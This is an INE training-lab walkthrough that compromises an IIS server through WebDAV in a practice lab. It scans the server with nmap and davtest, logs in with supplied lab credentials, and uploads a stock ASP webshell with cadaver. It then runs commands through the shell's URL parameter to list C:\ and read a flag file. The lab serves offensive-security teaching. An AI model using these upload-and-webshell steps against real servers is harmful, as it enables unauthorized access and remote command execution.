# LAB: Windows IIS Server DAVTest

#### **Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/f250374be0b99a51b1406f3749793c26fdd134b32b3f54e3bcd3c3c4c37a52da.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 2:** Run a Nmap scan against the target.

**Command:**

```
nmap demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/f7a9acd2b274af5049bb7fc4433a6eb598cc2a8a281395b367f8e1d5f764489f.jpg" alt=""><figcaption></figcaption></figure>

#### **Step 3:** We have discovered that multiple ports are open. We will be focusing on port 80 where the IIS server is running.

Running http-enum nmap script to discover interesting directories.

**Command:**

```
nmap --script http-enum -sV -p 80 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/df13a9ee854d7e5f3befd8de3bbcf5dcc1496d5750d880dfe55bafccaf797270.jpg" alt=""><figcaption></figcaption></figure>

We have found the webdav directory also received 401 error i.e Unauthorized.

#### **Step 4:** Running davtest tool.

**Command:**

```
davtest -url http://demo.ine.local/webdav
```

<figure><img src="https://assets.ine.com/lab/learningpath/81538439ab6feef8e856ced0105c381801ee35288e37c64807c4c74cc8500f97.jpg" alt=""><figcaption></figcaption></figure>

We can notice, /webdav path is secured with basic authentication. We have the credentials access the /webdav path using the provided credentials i.e bob:password\_123321.

**Command:**

```
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

<figure><img src="https://assets.ine.com/lab/learningpath/e90f3f5cfdbe3be317fdbdbf96a270fdbcdb5a70205a33acdecbb8e04f21a1f4.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/dabdc2afce8f66f02651ed02d38ee2b1931b943914d8a0e29e2cb2f875b89ea2.jpg" alt=""><figcaption></figcaption></figure>

We can notice, we have uploaded almost all the important file types to the /webdav directory. Also, we can execute three types of files. i.e asp, text, and html.

#### **Step 5:** Upload a .asp backdoor on the target machine to /webdav directory using cadaver utility.

The .asp backdoor present in “/usr/share/webshells/asp/” directory. i.e /usr/share/webshells/asp/webshell.asp

**Command:**

```
cadaver http://demo.ine.local/webdav
```

**Enter credentials:** bob:password\_123321

<figure><img src="https://assets.ine.com/lab/learningpath/0e8a479bd703ac58a70d18c7cf0fa87755135d98b625d4ae19b47bc279431dc7.jpg" alt=""><figcaption></figcaption></figure>

We can interact with the webdav directory using the cadaver tool.

#### **Step 6:** Uploading asp backdoor to the IIS web server in webdav directory.

**Commands:**

```
put /usr/share/webshells/asp/webshell.asp
ls
```

<figure><img src="https://assets.ine.com/lab/learningpath/e24fd10e5ffff7debfb827d15085538f2b3101c41d73cd6a615f9e1e7b0db81c.jpg" alt=""><figcaption></figcaption></figure>

We have successfully uploaded the backdoor.

#### **Step 7:** Access the backdoor using the firefox browser.

**URL:** http://demo.ine.local/webdav

**Enter credentials:** bob:password\_123321

<figure><img src="https://assets.ine.com/lab/learningpath/e4ed53f53886d9133749e73757dcccbfbf882a441d9665d64784f1bcf0caed20.jpg" alt=""><figcaption></figcaption></figure>

We can enter Windows commands in the text-box input field.

**URL:** http://demo.ine.local/webdav/webshell.asp

<figure><img src="https://assets.ine.com/lab/learningpath/e62852c0b3222af080d3dbbc448876e39e4bb0ce76d7766da503c685ea1b741f.jpg" alt=""><figcaption></figcaption></figure>

We can also input the command inside the URL query string parameter.

**URL:** http://demo.ine.local/webdav/webshell.asp?cmd=whoami

<figure><img src="https://assets.ine.com/lab/learningpath/bb3a8b1b8cf07977eb97ef9fdbdd2ed963873c92edddc410581e28fab5997fb9.jpg" alt=""><figcaption></figcaption></figure>

We are running as an IIS apppool.

#### **Step 8:** Read the flag.

Check the content of the C:\ drive.

**URL:** http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C

<figure><img src="https://assets.ine.com/lab/learningpath/329948f63fcc1d199bc7b37189ddc624c5597012e0cd69f1925caf8dcdeae812.jpg" alt=""><figcaption></figcaption></figure>

We can notice, there is a flag.txt file present in the C:\ drive. Reading it.

**URL:** http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt

<figure><img src="https://assets.ine.com/lab/learningpath/d8155d3afb0c5eb1d798bc884e30a74826aa902679c5a4d647f98e0bee864195.jpg" alt=""><figcaption></figcaption></figure>



























